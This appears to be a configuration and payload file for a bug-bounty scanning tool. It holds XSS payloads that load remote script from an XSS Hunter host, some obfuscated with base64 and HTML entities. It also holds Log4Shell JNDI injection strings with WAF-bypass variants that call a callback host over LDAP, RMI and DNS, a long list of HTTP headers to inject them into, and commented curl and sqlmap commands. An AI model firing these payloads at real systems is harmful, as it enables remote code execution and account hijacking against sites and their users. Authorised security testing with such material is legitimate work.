#### <Vars> ####
##Logging##
logTarget = "reco"
# platform = "bugcrowd"
# platform = "hacker1"
# Make sure you / at the end $path/logs/ NOT $path/logs
# logDir = f"~/{platform}/{logTarget}/logs/"
logDir = f"/{logTarget}/logs/"
##</Logging##

##wordlists##
#wordlist="/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt"
# wordlist = "/usr/share/wordlists/wfuzz/general/big.txt"
wordlist = "/usr/share/wordlists/dirb/common.txt"
##</wordlists##

##listeners##
attackerLDAP = 'yourinteracturl.interact.sh:1389'
callback_host = 'yourinteracturl.interact.sh'
##</listeners##

##XSS Hunter or other XSS payloads
xss_url = '3li.xss.ht'

#### </Vars> ####

singlequote = "'"
quotes = '"'
xsspayloads = [
        f'{singlequote}"><script src=https://{xss_url}></script>', 
        f'{singlequote}"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vM2xpLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>', 
        f'{singlequote}<script>$.getScript("//{xss_url}")</script>',
        f'"><script src=https://{xss_url}></script>', 
        f'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vM2xpLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>',
        f'<script>$.getScript("//{xss_url}")</script>',
        f'"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;{xss_url}&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
        f'{singlequote}"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;{xss_url}&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
]

proto = {'ldap', 'dns', 'rmi'}

waf_bypass_payloads = [
            "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
            "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
            "${jndi:rmi://{{callback_host}}}",
            "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
            "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
            "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
            "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
            "${jndi:dns://{{callback_host}}}",
]


Headers = [
            'Referer',
            'X-Api-Version',
            'Accept-Charset',
            'Accept-Datetime',
            'Accept-Encoding',
            'Accept-Language',
            'Cookie',
            'Forwarded',
            'Forwarded-For',
            'Forwarded-For-Ip',
            'Forwarded-Proto',
            'From',
            'TE',
            'True-Client-IP',
            'Upgrade',
            'User-Agent',
            'Via',
            'Warning',
            'X-Api-Version',
            'Max-Forwards',
            'Origin',
            'Pragma',
            'DNT',
            'Cache-Control',
            'X-Att-Deviceid',
            'X-ATT-DeviceId',
            'X-Correlation-ID',
            'X-Csrf-Token',
            'X-CSRFToken',
            'X-Do-Not-Track',
            'X-Foo',
            'X-Foo-Bar',
            'X-Forwarded',
            'X-Forwarded-By',
            'X-Forwarded-For',
            'X-Forwarded-For-Original',
            'X-Forwarded-Host',
            'X-Forwarded-Port',
            'X-Forwarded-Proto',
            'X-Forwarded-Protocol',
            'X-Forwarded-Scheme',
            'X-Forwarded-Server',
            'X-Forwarded-Ssl',
            'X-Forwarder-For',
            'X-Forward-For',
            'X-Forward-Proto',
            'X-Frame-Options',
            'X-From',
            'X-Geoip-Country',
            'X-Http-Destinationurl',
            'X-Http-Host-Override',
            'X-Http-Method',
            'X-Http-Method-Override',
            'X-HTTP-Method-Override',
            'X-Http-Path-Override',
            'X-Https',
            'X-Htx-Agent',
            'X-Hub-Signature',
            'X-If-Unmodified-Since',
            'X-Imbo-Test-Config',
            'X-Insight',
            'X-Ip',
            'X-Ip-Trail',
            'X-ProxyUser-Ip',
            'X-Requested-With',
            'X-Request-ID',
            'X-UIDH',
            'X-Wap-Profile',
            'X-XSRF-TOKEN',
]

##### Possible log4j Payloads ######
# used to do a specific curl and payload
# payload = f'${{jndi:ldap://{attacker}/t}}'
# os.system("curl https://target.com" + "\\" + payload + "&username=" + "\\" + payload)
# os.system("sqlmap -u " + '"' + i + '"' + " --batch --forms --tamper=apostrophemask --random-agent --level 3 --risk 3 >> " + logDir + "sqlMappedlog4j")
# os.system("curl " + i + "?foo=$\\" + URLPayload)
# headers={'User-Agent': f'${{jndi:ldap://{args.attacker_host}/exploit.class}}'}


##### Possible WAF Payloads #####
#VERIFY THESE ARE DIFFERENT THAN THE ONES ABOVE AND MERGE for "waf_bypass_payloads"
# ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
# ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
# ${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
# ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
# ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
# ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
# ${${::-j}ndi:rmi://attackerendpoint.com/}
